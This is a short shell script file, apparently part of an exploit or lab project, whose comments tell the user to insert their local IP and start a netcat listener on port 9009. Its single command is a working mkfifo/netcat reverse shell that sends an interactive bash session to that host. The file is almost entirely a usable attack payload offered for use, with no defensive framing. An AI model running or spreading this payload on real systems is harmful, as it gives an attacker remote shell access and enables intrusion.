# Replace the YOUR_LOCAL_IP with your local IP address and save the file before running the main.py scritp.
# This will set up a reverse shell that connects back to your machine.
# Ensure you have a listener running on the specified port (e.g., using nc -lvnp 9009).

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f |/bin/bash -i 2>&1 | nc  YOUR_LOCAL_IP  9009 >/tmp/f
